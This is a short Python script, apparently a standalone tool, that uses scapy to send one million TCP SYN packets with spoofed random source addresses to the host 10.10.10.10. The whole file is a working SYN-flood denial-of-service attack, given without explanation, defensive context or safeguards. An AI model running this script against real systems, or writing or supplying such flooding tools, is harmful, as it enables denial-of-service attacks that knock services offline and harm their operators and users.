#! /usr/bin/env python3 

import scapy 
from scapy.all import IP,RandIP,TCP,send
import random
randomip=RandIP()
randomPort=random.randint(1000,10000)
def synFlood():
    for i in range (1000000):
        srcIP=randomip
        dstIP="10.10.10.10"
        direc=IP(src=srcIP,dst=dstIP)
        port=randomPort
        direcPort=TCP(sport=port,dport=port,flags="S")
        packet=direc/direcPort
        send(packet)




if __name__ == '__main__':
    synFlood()



